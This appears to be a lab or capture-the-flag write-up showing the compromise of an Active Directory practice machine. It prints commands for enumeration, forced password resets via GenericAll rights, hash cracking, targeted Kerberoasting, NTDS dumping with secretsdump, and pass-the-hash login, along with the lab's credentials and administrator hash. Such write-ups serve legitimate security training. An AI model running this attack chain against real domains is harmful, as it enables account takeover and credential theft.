# ADMINISTRATOR (AD)

#### ### Listing Shared Resources:

```
smbclient -L //10.10.11.42 -U Olivia
```

PASSWORD : ichliebedich

#### Connect to `/SYSVAL` with the username "Olivia" and her password :

smbclient -U "Olivia" //10.10.11.42/SYSVAL\
Password for \[WORKGROUP Olivia]: ichliebedich smb: > prompt off _**smb: > recurse on smb: > ls**_ /for recursive listing

#### Eumerate other users via owned creds

```
crackmapexec smb 10.10.11.42 -u "Olivia" -p "ichliebedich" --rid-brute | grep SidTypeUser
```

We will use the command to check whether the user has access to WinRM, which is a protocol used for remote management and automation in Windows environments.”

winrm (windows Remote management ) by default winrm listens on

tcp port 5985 and 5986 tcp traffic

```
netexec winrm 10.10.11.42 -u olivia -p ichliebedich
```

![](https://miro.medium.com/v2/resize:fit:1094/1*v24nRywjOW0vTIlIiCTHoA.png)

`olivia` can execute remote commands and perform administrative tasks (depending on her permissions)

#### List the domain users

```
rpcclient -U "Olivia%ichliebedich" 10.10.11.42 -c "enumdomusers"
```

#### \*\*BloodHound Enumeration

```
bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10.10.11.42 --zip
```

* **What was done**: BloodHound was run to enumerate Active Directory (AD) information. It fetched information about the domain `administrator.htb`, including users, groups, organizational units (OUs), GPOs (Group Policy Objects), and computers in the domain.
* **Why it was done**: BloodHound is used to gather detailed information about Active Directory environments and help identify attack paths, such as finding users with elevated privileges or misconfigurations in AD. This helps attackers in Active Directory exploitation, lateral movement, and privilege escalation.

To graph the result run :

```
sudo neo4j console 
```

than **bloodhound**

!\[\[Pasted image 20241229170703.png]]

As we saw in Bloodhound, the user olivia has GenericAll permissions on the user michael.

**GenericAll** is one of the built-in permissions in Active Directory (AD) that allows full control over an object, such as a user or group. When a user, such as **Olivia**, has **GenericAll** permissions on another object, like the **Michael** account, they have **complete administrative access** over that object.

!\[\[Pasted image 20241229171741.png]]

Lets control BENJAMIN starting with changing MICHEAL password first

```
bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.10.11.42" set password "Michael" "123456789"
```

As we have access to MICHEAL now lets have acces to BENJAMIN

```
bloodyAD -u "Michael" -p "123456789" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "123456789"

```

The user Benjamin is authorized to access the FTP protocol.

after connecting to ftp , there was a backup file.

!\[\[Pasted image 20241229174125.png]]

psafe3 files are encrypted password security files.

They cannot be read directly and require the pwsafe2john tool to obtain the hash. Kali Linux comes with this tool.

```
pwsafe2john Backup.psafe3 > hash.txt
```

Having obtained the hash, attempt to decrypt it.

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Lets access the safe

```
pwsafe Backup.psafe3
```

lets save the passwords

!\[\[Pasted image 20241229174848.png]]

Since port 5985 is open on the target machine, you can use evil-winrm to remotely log in.

```
evil-winrm -i administrator.htb -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"
```

***

> A Kerberoasting attack targets service account credentials in a Windows domain by requesting service tickets (TGS) for service accounts, which are then retrieved and cracked offline. The attack exploits weak or easily guessable service account passwords by extracting and attempting to decrypt the tickets.

***

Because Emily has permissions on Ethan, the Targeted Kerberoasting attack can be used.

TargetedKerberoast is a Python script, similar to many other scripts (such as GetUserSPNs.py), which can print the 'kerberoast' hash for user accounts that have an SPN set. The tool brings the following additional feature: for each user without an SPN, it will attempt to set one (abusing write permissions to the attributes), print the 'kerberoast' hash, and then delete the temporary SPN set for this operation.

```
sudo ntpdate administrator.htb
```

```
python targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42 > hash.txt
```

***

**Located on /Desktop/Pentest/targetedkerberoast\_main**

```
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` 
```

Lets verify if the password trully correspond to ethan :

```
netexec smb 10.10.11.42 -u ethan -p limpbizkit   
```

(domain:administrator.htb) (signing:True) (SMBv1:False)

Yup it is :)

From bloodhound we can see that ETHAN has many relationships with the admin domain.

!\[\[Pasted image 20241230001919.png]]

Using ethan, you can get the admin’s hash.

**Impacket's `secretsdump` Tool**:

* `secretsdump` allows attackers (or legitimate administrators) to dump credentials from Windows systems using various methods, such as SMB, DCOM, or RPC.
* The `DRSUAPI` method used here refers to the method for accessing the **NTDS.dit** file (which contains the password hashes) directly from the **Domain Controller** (DC).

Command :

```
impacket-secretsdump "Administrator.htb/ethan:limpbizkit"@"10.10.11.42"
```

Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::

Then you can log in using the hash with evil-winrm.

```
evil-winrm -i administrator.htb -u administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"
```

## **Summary of the Process:**

1. **Access Shared Resources:**\
   The goal is to gain access to shared resources on the target machine. Using SMB, you connect to a shared folder (`/SYSVAL`) using valid credentials obtained earlier.
2. **Enumerate Users and Network Access:**\
   Once connected, you enumerate other users on the network. You check for any WinRM (Windows Remote Management) access, which would allow you to manage the system remotely.
3. **BloodHound Enumeration:**\
   BloodHound is used to gather detailed information about the Active Directory environment, including user privileges, group memberships, and permissions. This helps identify attack paths, such as users with elevated privileges or misconfigurations that can be exploited for lateral movement.
4. **Privilege Escalation via Permissions:**\
   From the BloodHound data, you find that the user `Olivia` has full control (GenericAll permission) over the user `Michael`. This gives Olivia administrative rights over Michael’s account.
5. **Password Reset and Escalation:**\
   Leveraging the permission on Michael’s account, you reset his password, then use it to escalate privileges to `Benjamin`, another user with access to critical resources.
6. **FTP Backup File Access:**\
   Upon accessing the FTP server, you discover a backup file containing encrypted password files. You extract and crack the passwords using tools designed for this purpose.
7. **Kerberoasting Attack:**\
   After exploiting weak passwords, you perform a Kerberoasting attack to extract service account credentials. This allows you to retrieve encrypted service tickets (TGS), which can then be cracked offline to obtain the service account’s password.
8. **Dumping Password Hashes:**\
   Once you have gained access to Ethan’s account, you use Impacket's `secretsdump` tool to dump the password hashes from the Domain Controller. This provides further access to the system.
9. **Final Access via Evil-WinRM:**\
   After obtaining the necessary credentials and hashes, you use **Evil-WinRM** to remotely log into the target system using the administrator account’s hash, gaining full administrative access.
